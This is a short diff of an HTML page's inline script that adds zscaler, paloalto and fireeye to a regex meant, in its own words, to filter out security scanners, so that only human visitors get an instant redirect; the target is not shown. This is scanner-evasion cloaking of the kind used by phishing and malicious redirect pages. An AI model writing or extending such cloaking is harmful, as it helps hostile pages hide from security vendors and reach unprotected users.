@@ -9,7 +9,7 @@
 
     <script>
       // Filter out common security scanners
-      const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft/i;
+      const botPattern = /bot|crawler|spider|crawling|slurp|w3c_validator|trendmicro|fortinet|proofpoint|microsoft|zscaler|paloalto|fireeye/i;
       
       if (!botPattern.test(navigator.userAgent)) {
           // Instant redirect for humans
